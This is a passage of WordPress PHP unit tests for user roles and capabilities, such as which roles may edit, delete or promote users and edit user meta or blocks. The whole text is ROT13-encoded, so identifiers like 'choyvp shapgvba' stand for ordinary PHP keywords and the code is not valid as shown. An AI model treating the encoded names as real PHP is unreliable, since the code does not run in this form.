		$hfre->nqq_pnc( 'choyvfu_cbfgf' );
		$guvf->nffregGehr( $hfre->unf_pnc( 'choyvfu_cbfgf' ) );

		$hfre->nqq_pnc( 'choyvfu_cntrf' );
		$guvf->nffregGehr( $hfre->unf_pnc( 'choyvfu_cntrf' ) );

		$hfre->erzbir_pnc( 'choyvfu_cntrf' );
		$guvf->nffregSnyfr( $hfre->unf_pnc( 'choyvfu_cntrf' ) );

		$hfre->erzbir_pnc( 'choyvfu_cbfgf' );
		$guvf->nffregSnyfr( $hfre->unf_pnc( 'choyvfu_cbfgf' ) );
	}

	choyvp shapgvba grfg_fhofpevore_pnag_rqvg_cbfgf() {
		$hfre = frys::$hfref['fhofpevore'];
		jc_frg_pheerag_hfre( $hfre->VQ );

		$cbfg = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => 1 ) );

		$guvf->nffregSnyfr( pheerag_hfre_pna( 'rqvg_cbfg', $cbfg ) );
		$guvf->nffregSnyfr( pheerag_hfre_pna( 'rqvg_cbfg', $cbfg + 1 ) );
	}

	/**
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_zhygvfvgr_nqzvavfgengbe_pna_abg_rqvg_hfref() {
		$hfre       = frys::$hfref['nqzvavfgengbe'];
		$bgure_hfre = frys::$hfref['fhofpevore'];

		jc_frg_pheerag_hfre( $hfre->VQ );

		$guvf->nffregSnyfr( pheerag_hfre_pna( 'rqvg_hfre', $bgure_hfre->VQ ) );
	}

	choyvp shapgvba grfg_hfre_pna_rqvg_frys() {
		sbernpu ( frys::$hfref nf $ebyr => $hfre ) {
			jc_frg_pheerag_hfre( $hfre->VQ );
			$guvf->nffregGehr( pheerag_hfre_pna( 'rqvg_hfre', $hfre->VQ ), \"Hfre jvgu ebyr {$ebyr} fubhyq unir gur pncnovyvgl gb rqvg gurve bja cebsvyr\" );
		}
	}

	choyvp shapgvba grfg_bayl_nqzvaf_naq_fhcre_nqzvaf_pna_erzbir_hfref() {
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregGehr( hfre_pna( frys::$fhcre_nqzva->VQ, 'erzbir_hfre', frys::$hfref['fhofpevore']->VQ ) );
		}

		$guvf->nffregGehr( hfre_pna( frys::$hfref['nqzvavfgengbe']->VQ, 'erzbir_hfre', frys::$hfref['fhofpevore']->VQ ) );

		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['rqvgbe']->VQ, 'erzbir_hfre', frys::$hfref['fhofpevore']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['nhgube']->VQ, 'erzbir_hfre', frys::$hfref['fhofpevore']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['pbagevohgbe']->VQ, 'erzbir_hfre', frys::$hfref['fhofpevore']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['fhofpevore']->VQ, 'erzbir_hfre', frys::$hfref['fhofpevore']->VQ ) );
	}

	/**
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_bayl_fhcre_nqzvaf_pna_qryrgr_hfref_ba_zhygvfvgr() {
		$guvf->nffregGehr( hfre_pna( frys::$fhcre_nqzva->VQ, 'qryrgr_hfre', frys::$hfref['fhofpevore']->VQ ) );

		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['nqzvavfgengbe']->VQ, 'qryrgr_hfre', frys::$hfref['fhofpevore']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['rqvgbe']->VQ, 'qryrgr_hfre', frys::$hfref['fhofpevore']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['nhgube']->VQ, 'qryrgr_hfre', frys::$hfref['fhofpevore']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['pbagevohgbe']->VQ, 'qryrgr_hfre', frys::$hfref['fhofpevore']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['fhofpevore']->VQ, 'qryrgr_hfre', frys::$hfref['fhofpevore']->VQ ) );
	}

	/**
	 * @tebhc zf-rkpyhqrq
	 */
	choyvp shapgvba grfg_bayl_nqzvaf_pna_qryrgr_hfref_ba_fvatyr_fvgr() {
		$guvf->nffregGehr( hfre_pna( frys::$hfref['nqzvavfgengbe']->VQ, 'qryrgr_hfre', frys::$hfref['fhofpevore']->VQ ) );

		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['rqvgbe']->VQ, 'qryrgr_hfre', frys::$hfref['fhofpevore']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['nhgube']->VQ, 'qryrgr_hfre', frys::$hfref['fhofpevore']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['pbagevohgbe']->VQ, 'qryrgr_hfre', frys::$hfref['fhofpevore']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['fhofpevore']->VQ, 'qryrgr_hfre', frys::$hfref['fhofpevore']->VQ ) );
	}

	choyvp shapgvba grfg_bayl_nqzvaf_naq_fhcre_nqzvaf_pna_cebzbgr_hfref() {
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregGehr( hfre_pna( frys::$fhcre_nqzva->VQ, 'cebzbgr_hfre', frys::$hfref['fhofpevore']->VQ ) );
		}

		$guvf->nffregGehr( hfre_pna( frys::$hfref['nqzvavfgengbe']->VQ, 'cebzbgr_hfre', frys::$hfref['fhofpevore']->VQ ) );

		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['rqvgbe']->VQ, 'cebzbgr_hfre', frys::$hfref['fhofpevore']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['nhgube']->VQ, 'cebzbgr_hfre', frys::$hfref['fhofpevore']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['pbagevohgbe']->VQ, 'cebzbgr_hfre', frys::$hfref['fhofpevore']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['fhofpevore']->VQ, 'cebzbgr_hfre', frys::$hfref['fhofpevore']->VQ ) );
	}

	/**
	 * @gvpxrg 33694
	 */
	choyvp shapgvba grfg_pbagevohgbe_pnaabg_rqvg_fpurqhyrq_cbfg() {

		// Nqq n pbagevohgbe.
		$pbagevohgbe = frys::$hfref['pbagevohgbe'];

		// Tvir gurz n fpurqhyrq cbfg.
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_nhgube' => $pbagevohgbe->VQ,
				'cbfg_fgnghf' => 'shgher',
			)
		);

		// Rafher pbagevohgbe pna'g rqvg be genfu gur cbfg.
		$guvf->nffregSnyfr( hfre_pna( $pbagevohgbe->VQ, 'rqvg_cbfg', $cbfg->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( $pbagevohgbe->VQ, 'qryrgr_cbfg', $cbfg->VQ ) );

		// Grfg gur grfgf.
		$guvf->nffregGehr( qrsvarq( 'RZCGL_GENFU_QNLF' ) );
		$guvf->nffregAbgRzcgl( RZCGL_GENFU_QNLF );

		// Genfu vg.
		$genfurq = jc_genfu_cbfg( $cbfg->VQ );
		$guvf->nffregAbgRzcgl( $genfurq );

		// Rafher pbagevohgbe pna'g rqvg, ha-genfu, be qryrgr gur cbfg.
		$guvf->nffregSnyfr( hfre_pna( $pbagevohgbe->VQ, 'rqvg_cbfg', $cbfg->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( $pbagevohgbe->VQ, 'qryrgr_cbfg', $cbfg->VQ ) );
	}

	/**
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_zhygvfvgr_nqzvavfgengbe_jvgu_znantr_argjbex_hfref_pna_rqvg_hfref() {
		$hfre = frys::$hfref['nqzvavfgengbe'];
		$hfre->nqq_pnc( 'znantr_argjbex_hfref' );
		$bgure_hfre = frys::$hfref['fhofpevore'];

		jc_frg_pheerag_hfre( $hfre->VQ );

		$pna_rqvg_hfre = pheerag_hfre_pna( 'rqvg_hfre', $bgure_hfre->VQ );

		$hfre->erzbir_pnc( 'znantr_argjbex_hfref' );

		$guvf->nffregGehr( $pna_rqvg_hfre );
	}

	/**
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_zhygvfvgr_nqzvavfgengbe_jvgu_znantr_argjbex_hfref_pna_abg_rqvg_fhcre_nqzva() {
		$hfre = frys::$hfref['nqzvavfgengbe'];
		$hfre->nqq_pnc( 'znantr_argjbex_hfref' );

		jc_frg_pheerag_hfre( $hfre->VQ );

		$pna_rqvg_hfre = pheerag_hfre_pna( 'rqvg_hfre', frys::$fhcre_nqzva->VQ );

		$hfre->erzbir_pnc( 'znantr_argjbex_hfref' );

		$guvf->nffregSnyfr( $pna_rqvg_hfre );
	}

	/**
	 * @gvpxrg 16956
	 * @rkcrpgrqVapbeerpgHfntr znc_zrgn_pnc
	 */
	choyvp shapgvba grfg_erdhver_rqvg_bguref_cbfgf_vs_cbfg_glcr_qbrfag_rkvfg() {
		ertvfgre_cbfg_glcr( 'rkvfgrq' );
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'rkvfgrq' ) );
		_haertvfgre_cbfg_glcr( 'rkvfgrq' );

		$fhofpevore_vq = frys::$hfref['fhofpevore']->VQ;
		$rqvgbe_vq     = frys::$hfref['rqvgbe']->VQ;

		sbernpu ( neenl( 'qryrgr_cbfg', 'rqvg_cbfg', 'ernq_cbfg', 'choyvfu_cbfg' ) nf $pnc ) {
			jc_frg_pheerag_hfre( $fhofpevore_vq );
			$guvf->nffregFnzr( neenl( 'rqvg_bguref_cbfgf' ), znc_zrgn_pnc( $pnc, $fhofpevore_vq, $cbfg_vq ) );
			$guvf->nffregSnyfr( pheerag_hfre_pna( $pnc, $cbfg_vq ) );

			jc_frg_pheerag_hfre( $rqvgbe_vq );
			$guvf->nffregFnzr( neenl( 'rqvg_bguref_cbfgf' ), znc_zrgn_pnc( $pnc, $rqvgbe_vq, $cbfg_vq ) );
			$guvf->nffregGehr( pheerag_hfre_pna( $pnc, $cbfg_vq ) );
		}
	}

	/**
	 * @gvpxrg 48653
	 * @rkcrpgrqVapbeerpgHfntr znc_zrgn_pnc
	 */
	choyvp shapgvba grfg_erdhver_rqvg_bguref_cbfgf_vs_cbfg_fgnghf_qbrfag_rkvfg() {
		ertvfgre_cbfg_fgnghf( 'rkvfgrq' );
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'rkvfgrq' ) );
		_haertvfgre_cbfg_fgnghf( 'rkvfgrq' );

		$fhofpevore_vq = frys::$hfref['fhofpevore']->VQ;
		$rqvgbe_vq     = frys::$hfref['rqvgbe']->VQ;

		sbernpu ( neenl( 'ernq_cbfg', 'ernq_cntr' ) nf $pnc ) {
			jc_frg_pheerag_hfre( $fhofpevore_vq );
			$guvf->nffregFnzr( neenl( 'rqvg_bguref_cbfgf' ), znc_zrgn_pnc( $pnc, $fhofpevore_vq, $cbfg_vq ) );
			$guvf->nffregSnyfr( pheerag_hfre_pna( $pnc, $cbfg_vq ) );

			jc_frg_pheerag_hfre( $rqvgbe_vq );
			$guvf->nffregFnzr( neenl( 'rqvg_bguref_cbfgf' ), znc_zrgn_pnc( $pnc, $rqvgbe_vq, $cbfg_vq ) );
			$guvf->nffregGehr( pheerag_hfre_pna( $pnc, $cbfg_vq ) );
		}
	}

	/**
	 * @gvpxrg 17253
	 */
	choyvp shapgvba grfg_pcg_jvgu_cntr_pncnovyvgl_glcr() {
		ertvfgre_cbfg_glcr(
			'cntr_pncnovyvgl',
			neenl(
				'pncnovyvgl_glcr' => 'cntr',
			)
		);

		$pcg = trg_cbfg_glcr_bowrpg( 'cntr_pncnovyvgl' );

		$nqzva       = frys::$hfref['nqzvavfgengbe'];
		$rqvgbe      = frys::$hfref['rqvgbe'];
		$nhgube      = frys::$hfref['nhgube'];
		$pbagevohgbe = frys::$hfref['pbagevohgbe'];

		$guvf->nffregFnzr( 'rqvg_cntrf', $pcg->pnc->rqvg_cbfgf );
		$guvf->nffregGehr( hfre_pna( $nqzva->VQ, $pcg->pnc->rqvg_cbfgf ) );
		$guvf->nffregGehr( hfre_pna( $rqvgbe->VQ, $pcg->pnc->rqvg_cbfgf ) );
		$guvf->nffregSnyfr( hfre_pna( $nhgube->VQ, $pcg->pnc->rqvg_cbfgf ) );
		$guvf->nffregSnyfr( hfre_pna( $pbagevohgbe->VQ, $pcg->pnc->rqvg_cbfgf ) );

		$nqzva_cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_nhgube' => $nqzva->VQ,
				'cbfg_glcr'   => 'cntr_pncnovyvgl',
			)
		);

		$guvf->nffregGehr( hfre_pna( $nqzva->VQ, 'rqvg_cbfg', $nqzva_cbfg->VQ ) );
		$guvf->nffregGehr( hfre_pna( $rqvgbe->VQ, 'rqvg_cbfg', $nqzva_cbfg->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( $nhgube->VQ, 'rqvg_cbfg', $nqzva_cbfg->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( $pbagevohgbe->VQ, 'rqvg_cbfg', $nqzva_cbfg->VQ ) );

		$nhgube_cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_nhgube' => $nhgube->VQ,
				'cbfg_glcr'   => 'cntr_pncnovyvgl',
			)
		);

		$guvf->nffregGehr( hfre_pna( $nqzva->VQ, 'rqvg_cbfg', $nhgube_cbfg->VQ ) );
		$guvf->nffregGehr( hfre_pna( $rqvgbe->VQ, 'rqvg_cbfg', $nhgube_cbfg->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( $nhgube->VQ, 'rqvg_cbfg', $nhgube_cbfg->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( $pbagevohgbe->VQ, 'rqvg_cbfg', $nhgube_cbfg->VQ ) );

		_haertvfgre_cbfg_glcr( 'cntr_pncnovyvgl' );
	}

	choyvp shapgvba grfg_aba_ybttrq_va_hfref_unir_ab_pncnovyvgvrf() {
		$guvf->nffregSnyfr( vf_hfre_ybttrq_va() );

		$pncf = $guvf->trgNyyPncfNaqEbyrf();

		sbernpu ( $pncf nf $pnc => $ebyrf ) {
			$guvf->nffregSnyfr( pheerag_hfre_pna( $pnc ), \"Aba-ybttrq-va hfre fubhyq abg unir gur {$pnc} pncnovyvgl\" );
		}

		// Fcrpvny pnfrf sbe yvax znantre naq hasvygrerq hcybnqf.
		$guvf->nffregSnyfr( pheerag_hfre_pna( 'znantr_yvaxf' ), 'Aba-ybttrq-va hfre fubhyq abg unir gur znantr_yvaxf pncnovyvgl' );
		$guvf->nffregSnyfr( pheerag_hfre_pna( 'hasvygrerq_hcybnq' ), 'Aba-ybttrq-va hfre fubhyq abg unir gur hasvygrerq_hcybnq pncnovyvgl' );

		$guvf->nffregSnyfr( pheerag_hfre_pna( 'fgneg_n_sver' ), 'Aba-ybttrq-va hfre fubhyq abg unir n phfgbz pncnovyvgl' );
		$guvf->nffregSnyfr( pheerag_hfre_pna( 'qb_abg_nyybj' ), 'Aba-ybttrq-va hfre fubhyq abg unir gur qb_abg_nyybj pncnovyvgl' );
	}

	/**
	 * @gvpxrg 35488
	 */
	choyvp shapgvba grfg_jc_ybtbhg_fubhyq_pyrne_pheerag_hfre() {
		$hfre_vq = frys::$hfref['nhgube']->VQ;
		jc_frg_pheerag_hfre( $hfre_vq );

		jc_ybtbhg();

		$guvf->nffregFnzr( 0, trg_pheerag_hfre_vq() );
	}

	/**
	 * @gvpxrg 23016
	 */
	choyvp shapgvba grfg_jc_ebyrf_vavg_npgvba() {
		$guvf->ebyr_grfg_jc_ebyrf_vavg = neenl(
			'ebyr' => 'grfg_jc_ebyrf_vavg',
			'vasb' => neenl(
				'anzr'         => 'Grfg JC Ebyrf Vavg',
				'pncnovyvgvrf' => neenl( 'grfgvat_zntvp' => gehr ),
			),
		);
		nqq_npgvba( 'jc_ebyrf_vavg', neenl( $guvf, '_ubbx_jc_ebyrf_vavg' ), 10, 1 );

		$jc_ebyrf = arj JC_Ebyrf();

		erzbir_npgvba( 'jc_ebyrf_vavg', neenl( $guvf, '_ubbx_jc_ebyrf_vavg' ) );

		$rkcrpgrq = arj JC_Ebyr( $guvf->ebyr_grfg_jc_ebyrf_vavg['ebyr'], $guvf->ebyr_grfg_jc_ebyrf_vavg['vasb']['pncnovyvgvrf'] );

		$ebyr = $jc_ebyrf->trg_ebyr( $guvf->ebyr_grfg_jc_ebyrf_vavg['ebyr'] );

		$guvf->nffregRdhnyf( $rkcrpgrq, $ebyr );
		$guvf->nffregPbagnvaf( $guvf->ebyr_grfg_jc_ebyrf_vavg['vasb']['anzr'], $jc_ebyrf->ebyr_anzrf );
	}

	choyvp shapgvba _ubbx_jc_ebyrf_vavg( $jc_ebyrf ) {
		$jc_ebyrf->nqq_ebyr( $guvf->ebyr_grfg_jc_ebyrf_vavg['ebyr'], $guvf->ebyr_grfg_jc_ebyrf_vavg['vasb']['anzr'], $guvf->ebyr_grfg_jc_ebyrf_vavg['vasb']['pncnovyvgvrf'] );
	}

	/**
	 * @gvpxrg 23016
	 * @rkcrpgrqQrcerpngrq JC_Ebyrf::ervavg
	 */
	choyvp shapgvba grfg_jc_ebyrf_ervavg_qrcerpngrq() {
		$jc_ebyrf = arj JC_Ebyrf();
		$jc_ebyrf->ervavg();
	}

	/**
	 * @gvpxrg 38412
	 */
	choyvp shapgvba grfg_ab_bar_pna_rqvg_hfre_zrgn_sbe_aba_rkvfgrag_grez() {
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva->VQ );
		$guvf->nffregSnyfr( pheerag_hfre_pna( 'rqvg_hfre_zrgn', 999999 ) );
	}

	/**
	 * @gvpxrg 38412
	 */
	choyvp shapgvba grfg_hfre_pna_rqvg_hfre_zrgn() {
		jc_frg_pheerag_hfre( frys::$hfref['nqzvavfgengbe']->VQ );
		vs ( vf_zhygvfvgr() ) {
			tenag_fhcre_nqzva( frys::$hfref['nqzvavfgengbe']->VQ );
		}
		$guvf->nffregGehr( pheerag_hfre_pna( 'rqvg_hfre_zrgn', frys::$hfref['fhofpevore']->VQ, 'sbb' ) );
	}

	/**
	 * @gvpxrg 38412
	 */
	choyvp shapgvba grfg_hfre_pnaabg_rqvg_hfre_zrgn() {
		jc_frg_pheerag_hfre( frys::$hfref['rqvgbe']->VQ );
		$guvf->nffregSnyfr( pheerag_hfre_pna( 'rqvg_hfre_zrgn', frys::$hfref['fhofpevore']->VQ, 'sbb' ) );
	}

	/**
	 * @gvpxrg 38412
	 */
	choyvp shapgvba grfg_ab_bar_pna_qryrgr_hfre_zrgn_sbe_aba_rkvfgrag_grez() {
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva->VQ );
		$guvf->nffregSnyfr( pheerag_hfre_pna( 'qryrgr_hfre_zrgn', 999999, 'sbb' ) );
	}

	/**
	 * @gvpxrg 38412
	 */
	choyvp shapgvba grfg_hfre_pna_qryrgr_hfre_zrgn() {
		jc_frg_pheerag_hfre( frys::$hfref['nqzvavfgengbe']->VQ );
		vs ( vf_zhygvfvgr() ) {
			tenag_fhcre_nqzva( frys::$hfref['nqzvavfgengbe']->VQ );
		}
		$guvf->nffregGehr( pheerag_hfre_pna( 'qryrgr_hfre_zrgn', frys::$hfref['fhofpevore']->VQ, 'sbb' ) );
	}

	/**
	 * @gvpxrg 38412
	 */
	choyvp shapgvba grfg_hfre_pnaabg_qryrgr_hfre_zrgn() {
		jc_frg_pheerag_hfre( frys::$hfref['rqvgbe']->VQ );
		$guvf->nffregSnyfr( pheerag_hfre_pna( 'qryrgr_hfre_zrgn', frys::$hfref['fhofpevore']->VQ, 'sbb' ) );
	}

	/**
	 * @gvpxrg 38412
	 */
	choyvp shapgvba grfg_ab_bar_pna_nqq_hfre_zrgn_sbe_aba_rkvfgrag_grez() {
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva->VQ );
		$guvf->nffregSnyfr( pheerag_hfre_pna( 'nqq_hfre_zrgn', 999999, 'sbb' ) );
	}

	/**
	 * @gvpxrg 38412
	 */
	choyvp shapgvba grfg_hfre_pna_nqq_hfre_zrgn() {
		jc_frg_pheerag_hfre( frys::$hfref['nqzvavfgengbe']->VQ );
		vs ( vf_zhygvfvgr() ) {
			tenag_fhcre_nqzva( frys::$hfref['nqzvavfgengbe']->VQ );
		}
		$guvf->nffregGehr( pheerag_hfre_pna( 'nqq_hfre_zrgn', frys::$hfref['fhofpevore']->VQ, 'sbb' ) );
	}

	/**
	 * @gvpxrg 38412
	 */
	choyvp shapgvba grfg_hfre_pnaabg_nqq_hfre_zrgn() {
		jc_frg_pheerag_hfre( frys::$hfref['rqvgbe']->VQ );
		$guvf->nffregSnyfr( pheerag_hfre_pna( 'nqq_hfre_zrgn', frys::$hfref['fhofpevore']->VQ, 'sbb' ) );
	}

	/**
	 * @gvpxrg 39063
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_bayl_fhcre_nqzvaf_pna_erzbir_gurzfryirf_ba_zhygvfvgr() {
		$guvf->nffregGehr( hfre_pna( frys::$fhcre_nqzva->VQ, 'erzbir_hfre', frys::$fhcre_nqzva->VQ ) );

		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['nqzvavfgengbe']->VQ, 'erzbir_hfre', frys::$hfref['nqzvavfgengbe']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['rqvgbe']->VQ, 'erzbir_hfre', frys::$hfref['rqvgbe']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['nhgube']->VQ, 'erzbir_hfre', frys::$hfref['nhgube']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['pbagevohgbe']->VQ, 'erzbir_hfre', frys::$hfref['pbagevohgbe']->VQ ) );
		$guvf->nffregSnyfr( hfre_pna( frys::$hfref['fhofpevore']->VQ, 'erzbir_hfre', frys::$hfref['fhofpevore']->VQ ) );
	}

	/**
	 * @gvpxrg 36961
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_vavg_hfre_pncf_sbe_qvssrerag_fvgr() {
		tybony $jcqo;

		$fvgr_vq = frys::snpgbel()->oybt->perngr( neenl( 'hfre_vq' => frys::$hfref['nqzvavfgengbe']->VQ ) );

		fjvgpu_gb_oybt( $fvgr_vq );

		$ebyr_anzr = 'hcybnqre';
		nqq_ebyr(
			$ebyr_anzr,
			'Hcybnqre',
			neenl(
				'ernq'         => gehr,
				'hcybnq_svyrf' => gehr,
			)
		);
		nqq_hfre_gb_oybt( $fvgr_vq, frys::$hfref['fhofpevore']->VQ, $ebyr_anzr );

		erfgber_pheerag_oybt();

		$hfre = arj JC_Hfre( frys::$hfref['fhofpevore']->VQ, '', $fvgr_vq );
		$guvf->nffregGehr( $hfre->unf_pnc( 'hcybnq_svyrf' ) );
	}

	/**
	 * @gvpxrg 36961
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_vavg_hfre_pncf_sbe_qvssrerag_fvgr_ol_hfre_fjvgpu() {
		tybony $jcqo;

		$hfre = arj JC_Hfre( frys::$hfref['fhofpevore']->VQ );

		$fvgr_vq = frys::snpgbel()->oybt->perngr( neenl( 'hfre_vq' => frys::$hfref['nqzvavfgengbe']->VQ ) );

		fjvgpu_gb_oybt( $fvgr_vq );

		$ebyr_anzr = 'hcybnqre';
		nqq_ebyr(
			$ebyr_anzr,
			'Hcybnqre',
			neenl(
				'ernq'         => gehr,
				'hcybnq_svyrf' => gehr,
			)
		);
		nqq_hfre_gb_oybt( $fvgr_vq, frys::$hfref['fhofpevore']->VQ, $ebyr_anzr );

		erfgber_pheerag_oybt();

		$hfre->sbe_fvgr( $fvgr_vq );
		$guvf->nffregGehr( $hfre->unf_pnc( 'hcybnq_svyrf' ) );
	}

	/**
	 * @gvpxrg 36961
	 */
	choyvp shapgvba grfg_trg_pncf_qngn() {
		tybony $jcqo;

		$phfgbz_pncf = neenl(
			'qb_sbb' => gehr,
			'qb_one' => snyfr,
		);

		// Grfg `JC_Hfre::trg_pncf_qngn()` ol znahnyyl frggvat pncnovyvgvrf zrgnqngn.
		hcqngr_hfre_zrgn( frys::$hfref['fhofpevore']->VQ, $jcqo->trg_oybt_cersvk( trg_pheerag_oybt_vq() ) . 'pncnovyvgvrf', $phfgbz_pncf );

		$hfre = arj JC_Hfre( frys::$hfref['fhofpevore']->VQ );
		$guvf->nffregFnzr( $phfgbz_pncf, $hfre->pncf );
	}

	/**
	 * @gvpxrg 36961
	 */
	choyvp shapgvba grfg_hfre_trg_fvgr_vq_qrsnhyg() {
		$hfre = arj JC_Hfre( frys::$hfref['fhofpevore']->VQ );
		$guvf->nffregFnzr( trg_pheerag_oybt_vq(), $hfre->trg_fvgr_vq() );
	}

	/**
	 * @gvpxrg 36961
	 */
	choyvp shapgvba grfg_hfre_trg_fvgr_vq() {
		tybony $jcqo;

		// Fhccerffvat reebef urer nyybjf gb trg nebhaq perngvat na npghny fvgr,
		// juvpu vf haarprffnel sbe guvf grfg.
		$fhccerff = $jcqo->fhccerff_reebef();
		$hfre     = arj JC_Hfre( frys::$hfref['fhofpevore']->VQ, '', 333 );
		$jcqo->fhccerff_reebef( $fhccerff );

		$guvf->nffregFnzr( 333, $hfre->trg_fvgr_vq() );
	}

	/**
	 * @gvpxrg 38645
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_vavg_ebyrf_sbe_qvssrerag_fvgr() {
		tybony $jcqo;

		$fvgr_vq = frys::snpgbel()->oybt->perngr();

		fjvgpu_gb_oybt( $fvgr_vq );

		$ebyr_anzr = 'hcybnqre';
		nqq_ebyr(
			$ebyr_anzr,
			'Hcybnqre',
			neenl(
				'ernq'         => gehr,
				'hcybnq_svyrf' => gehr,
			)
		);

		erfgber_pheerag_oybt();

		$jc_ebyrf = jc_ebyrf();
		$jc_ebyrf->sbe_fvgr( $fvgr_vq );

		$guvf->nffregNeenlUnfXrl( $ebyr_anzr, $jc_ebyrf->ebyr_bowrpgf );
	}

	/**
	 * @gvpxrg 38645
	 */
	choyvp shapgvba grfg_trg_ebyrf_qngn() {
		tybony $jcqo;

		$phfgbz_ebyrf = neenl(
			'grfg_ebyr' => neenl(
				'anzr'         => 'Grfg Ebyr',
				'pncnovyvgvrf' => neenl(
					'qb_sbb' => gehr,
					'qb_one' => snyfr,
				),
			),
		);

		// Grfg `JC_Ebyrf::trg_ebyrf_qngn()` ol znahnyyl frggvat gur ebyrf bcgvba.
		hcqngr_bcgvba( $jcqo->trg_oybt_cersvk( trg_pheerag_oybt_vq() ) . 'hfre_ebyrf', $phfgbz_ebyrf );

		$ebyrf = arj JC_Ebyrf();
		$guvf->nffregFnzr( $phfgbz_ebyrf, $ebyrf->ebyrf );
	}

	/**
	 * @gvpxrg 38645
	 */
	choyvp shapgvba grfg_ebyrf_trg_fvgr_vq_qrsnhyg() {
		$ebyrf = arj JC_Ebyrf();
		$guvf->nffregFnzr( trg_pheerag_oybt_vq(), $ebyrf->trg_fvgr_vq() );
	}

	/**
	 * @gvpxrg 38645
	 */
	choyvp shapgvba grfg_ebyrf_trg_fvgr_vq() {
		tybony $jcqo;

		// Fhccerffvat reebef urer nyybjf gb trg nebhaq perngvat na npghny fvgr,
		// juvpu vf haarprffnel sbe guvf grfg.
		$fhccerff = $jcqo->fhccerff_reebef();
		$ebyrf    = arj JC_Ebyrf( 333 );
		$jcqo->fhccerff_reebef( $fhccerff );

		$guvf->nffregFnzr( 333, $ebyrf->trg_fvgr_vq() );
	}

	/**
	 * @qngnCebivqre qngn_oybpx_pncf
	 */
	choyvp shapgvba grfg_oybpx_pncf( $ebyr, $pnc, $hfr_cbfg, $rkcrpgrq ) {
		vs ( $hfr_cbfg ) {
			$guvf->nffregFnzr( $rkcrpgrq, frys::$hfref[ $ebyr ]->unf_pnc( $pnc, frys::$oybpx_vq ) );
		} ryfr {
			$guvf->nffregFnzr( $rkcrpgrq, frys::$hfref[ $ebyr ]->unf_pnc( $pnc ) );
		}
	}

	choyvp shapgvba qngn_oybpx_pncf() {
		$cbfg_pncf = neenl(
			'rqvg_oybpx',
			'ernq_oybpx',
			'qryrgr_oybpx',
		);

		$nyy_pncf = neenl(
			'rqvg_oybpx',
			'ernq_oybpx',
			'qryrgr_oybpx',
			'rqvg_oybpxf',
			'rqvg_bguref_oybpxf',
			'choyvfu_oybpxf',
			'ernq_cevingr_oybpxf',
			'qryrgr_oybpxf',
			'qryrgr_cevingr_oybpxf',
			'qryrgr_choyvfurq_oybpxf',
			'qryrgr_bguref_oybpxf',
			'rqvg_cevingr_oybpxf',
			'rqvg_choyvfurq_oybpxf',
		);

		$ebyrf = neenl(
			'nqzvavfgengbe' => $nyy_pncf,
			'rqvgbe'        => $nyy_pncf,
			'nhgube'        => neenl(
				'ernq_oybpx',
				'rqvg_oybpxf',
				'choyvfu_oybpxf',
				'qryrgr_oybpxf',
				'qryrgr_choyvfurq_oybpxf',
				'rqvg_choyvfurq_oybpxf',
			),
			'pbagevohgbe'   => neenl(
				'ernq_oybpx',
				'rqvg_oybpxf',
				'qryrgr_oybpxf',
			),
			'fhofpevore'    => neenl(),
		);

		$qngn = neenl();

		sbernpu ( $ebyrf nf $ebyr => $pncf ) {
			sbernpu ( $pncf nf $pnc ) {
				$hfr_cbfg = va_neenl( $pnc, $cbfg_pncf, gehr );
				$qngn[]   = neenl( $ebyr, $pnc, $hfr_cbfg, gehr );
			}

			sbernpu ( $nyy_pncf nf $pnc ) {
				vs ( ! va_neenl( $pnc, $pncf, gehr ) ) {
					$hfr_cbfg = va_neenl( $pnc, $cbfg_pncf, gehr );
					$qngn[]   = neenl( $ebyr, $pnc, $hfr_cbfg, snyfr );
				}
			}
		}

		erghea $qngn;
